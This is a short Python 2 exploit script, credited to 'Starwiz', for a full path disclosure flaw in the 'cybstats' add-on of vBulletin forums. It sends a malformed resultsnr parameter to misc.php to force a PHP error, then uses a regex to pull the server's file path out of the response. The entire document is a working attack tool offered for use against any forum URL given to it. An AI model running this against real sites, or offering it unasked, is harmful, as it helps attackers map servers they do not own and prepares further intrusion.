#/usr/bin/python
import urllib2, sys, re

print 'Doxsters VIP vbulletin cybstats full path disclosure vulnerability.'
print 'Vulnerability found and script written by Starwiz \n'

if len(sys.argv) != 2:
    print 'Usage: \t\t' + sys.argv[0] + ' forum'
    print 'Example: \t' + sys.argv[0] + ' http://www.example-forum.net/forum/'
    sys.exit()

forum = sys.argv[1]
regex = re.compile('((?:\\/[\\w\\.\\-]+)+)',re.IGNORECASE|re.DOTALL)
miscl = str(forum) + 'misc.php'
cybl = str(forum) + 'misc.php?do=cybstats&resultsnr=1337133713371337Starwiz1337133713371337'
misc = urllib2.urlopen(miscl).read()
cyb = urllib2.urlopen(cybl).read()

if misc == cyb:
    print 'Sorry, cybstats is\'t installed, the exploit wont work =['
    sys.exit()
    
if cyb == '':
    print 'PHP error listing is disabled.. The exploit wont work =['
    sys.exit()

location = regex.findall(cyb)

print 'Location found: \n' + str(location[1])